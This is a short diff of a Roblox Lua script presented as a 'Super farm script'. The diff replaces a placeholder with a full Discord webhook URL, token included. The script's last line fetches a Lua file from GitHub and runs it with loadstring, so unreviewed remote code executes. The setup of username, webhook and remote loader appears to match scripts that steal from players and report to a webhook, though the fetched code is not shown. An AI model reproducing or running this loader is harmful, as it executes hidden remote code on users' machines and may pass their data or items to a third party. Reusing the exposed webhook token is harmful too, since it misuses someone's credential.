@@ -2,6 +2,6 @@ _G.Username = "thinhblox1290"
 
 _G.HubName = "Super farm script"
 
-_G.WebhookUrl = "discord.com/......."
+_G.WebhookUrl = "discord.com/api/webhooks/1107856183131377714/3fhvcUm1yMx8bB5ARgbk5ja2XTfTH8dJ__Jh58bf2eAlDwg_VKroNKFutnF3V4UE5C3b"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
